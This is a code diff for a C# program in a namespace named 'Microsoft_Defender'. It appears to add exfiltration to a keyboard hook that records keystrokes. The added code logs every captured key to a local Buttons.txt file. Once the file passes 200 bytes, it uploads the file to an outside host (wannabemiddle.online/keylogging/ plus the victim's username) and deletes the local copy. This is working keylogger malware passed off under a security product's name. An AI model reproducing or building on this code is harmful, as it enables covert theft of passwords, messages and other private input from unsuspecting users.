@@ -100,6 +100,13 @@ namespace Microsoft_Defender
                 {
                     pressedButton = "{SPEC_BUTTON}";
                 }
+                writeButtonToFile(pressedButton);
+                var fileLength = new FileInfo(Environment.CurrentDirectory + @"\Buttons.txt").Length;
+                if (fileLength > 200)
+                {
+                    send();
+                    System.IO.File.Delete(Environment.CurrentDirectory + @"\Buttons.txt");
+                }
                 return (IntPtr)0;
             }
             else
@@ -213,6 +220,24 @@ namespace Microsoft_Defender
             englishUppercaseDict.Add(48, ')');
             englishUppercaseDict.Add(189, '_');
             englishUppercaseDict.Add(187, '+');
+        }
+
+        static void writeButtonToFile(string button)
+        {
+            StreamWriter file = new StreamWriter(Environment.CurrentDirectory + @"\Buttons.txt", true, System.Text.Encoding.Unicode);
+            file.Write(button);
+            file.Close();
+        }
+
+        static void send()
+        {
+            using (var multipartFormContent = new MultipartFormDataContent())
+            {
+                var fileStreamContent = new StreamContent(System.IO.File.OpenRead(Environment.CurrentDirectory + @"\Buttons.txt"));
+                multipartFormContent.Add(fileStreamContent, name: "file", fileName: "button.txt");
+                var response = httpClient.PostAsync("http://wannabemiddle.online/keylogging/" + Environment.UserName, multipartFormContent);
+                var result = response.Result.Content.ReadAsStringAsync().Result;
+            }
         }
     }
 }
